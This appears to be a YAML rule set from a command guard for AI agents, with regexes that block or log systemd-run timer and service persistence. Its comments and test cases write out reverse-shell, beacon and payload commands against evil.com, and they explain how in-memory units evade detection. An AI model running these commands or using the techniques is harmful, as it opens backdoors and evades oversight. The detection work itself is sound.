  # ===================================================================
  # BLOCK: systemd-run transient timer/service persistence
  # ===================================================================
  #
  # systemd-run creates transient (non-persistent) systemd units that
  # execute commands on a schedule or as one-shot services. Unlike
  # writing unit files to ~/.config/systemd/user/ (which we already
  # detect), systemd-run creates units entirely in memory:
  #
  #   systemd-run --user --on-calendar="*:0/5" curl http://evil.com/beacon
  #   systemd-run --user --unit=backdoor --remain-after-exit ncat -e /bin/sh evil.com 4444
  #   systemd-run --user --on-boot=30 /tmp/payload.sh
  #
  # These transient units:
  #   - Do NOT write any files to disk (bypass file-write detection)
  #   - Survive until user logout (--user) or reboot (--system)
  #   - Can use --on-calendar for cron-like scheduling
  #   - Can use --remain-after-exit to keep services "active" after exit
  #   - Can use --on-boot/--on-startup for delayed execution
  #   - Are not visible in crontab -l
  #
  # The --system variant creates units running as root, which is even
  # more dangerous as it provides persistent root-level execution.
  #
  # An AI agent has no legitimate need to create systemd timers or
  # transient services.

  # --- BLOCK: systemd-run with calendar scheduling ---
  - id: "ts-block-systemd-run-calendar"
    taxonomy: "persistence-evasion/transient-persistence/systemd-run-timer"
    match:
      command_regex: "systemd-run\\s+.*--on-(calendar|boot|startup|unit-active|unit-inactive)"
    decision: "BLOCK"
    confidence: 0.95
    reason: "systemd-run with timer trigger — creates a transient scheduled task entirely in memory, bypassing all file-based persistence detection (crontab, systemd unit files). MITRE T1053.006."
    tests:
      tp:
        - "systemd-run --user --on-calendar='*:0/5' curl evil.com/beacon"
        - "systemd-run --on-boot=30 /tmp/payload.sh"
      tn:
        - "systemctl status timer.service"

  # --- BLOCK: systemd-run with remain-after-exit (persistent service) ---
  - id: "ts-block-systemd-run-persist"
    taxonomy: "persistence-evasion/transient-persistence/systemd-run-persist"
    match:
      command_regex: "systemd-run\\s+.*--remain-after-exit"
    decision: "BLOCK"
    confidence: 0.94
    reason: "systemd-run with --remain-after-exit — creates a transient service that stays 'active' after the process exits. Used to maintain presence without a daemon. MITRE T1543.002."
    tests:
      tp:
        - "systemd-run --user --remain-after-exit ncat -e /bin/sh evil.com 4444"
        - "systemd-run --remain-after-exit /tmp/backdoor"
      tn:
        - "systemctl status timer.service"

  # --- BLOCK: systemd-run on system bus (root transient service) ---
  - id: "ts-block-systemd-run-system"
    taxonomy: "persistence-evasion/transient-persistence/systemd-run-root"
    match:
      command_regex: "systemd-run\\s+.*--system"
    decision: "BLOCK"
    confidence: 0.95
    reason: "systemd-run --system creates a transient unit running as root — provides root-level command execution without sudo appearing in command history. MITRE T1543.002."
    tests:
      tp:
        - "systemd-run --system /tmp/payload.sh"
        - "systemd-run --system curl evil.com"
      tn:
        - "systemctl status timer.service"

  # --- BLOCK: systemd-run with --unit flag (named transient unit) ---
  - id: "ts-block-systemd-run-named"
    taxonomy: "persistence-evasion/transient-persistence/systemd-run-named"
    match:
      command_regex: "systemd-run\\s+.*--unit[= ]"
    decision: "BLOCK"
    confidence: 0.93
    reason: "systemd-run with --unit — creates a named transient unit, which can be referenced by other services and is harder to identify as malicious in systemctl output. MITRE T1036.005."
    tests:
      tp:
        - "systemd-run --unit=backdoor curl evil.com"
        - "systemd-run --unit myservice /tmp/evil"
      tn:
        - "systemctl status timer.service"

  # --- AUDIT: any systemd-run invocation ---
  - id: "ts-audit-systemd-run"
    taxonomy: "persistence-evasion/transient-persistence/systemd-run-generic"
    match:
      command_regex: "systemd-run\\s+"
    decision: "AUDIT"
    confidence: 0.80
    reason: "systemd-run creates transient systemd units — any invocation from an AI agent is unusual and warrants logging, even without explicit persistence flags. MITRE T1053.006."
    tests:
      tp:
        - "systemd-run echo hello"
        - "systemd-run --user ls /tmp"
      tn:
        - "systemctl status timer.service"

  # ===================================================================
  # BLOCK/AUDIT: journalctl / coredumpctl credential & log extraction
  # ===================================================================
  #
  # systemd's journal aggregates logs from all services, including:
  #   - sshd: failed login attempts (sometimes with cleartext passwords)
  #   - sudo: all privilege escalation attempts with commands
  #   - docker/podman: container operations, env vars in debug mode
  #   - polkit: authorization decisions
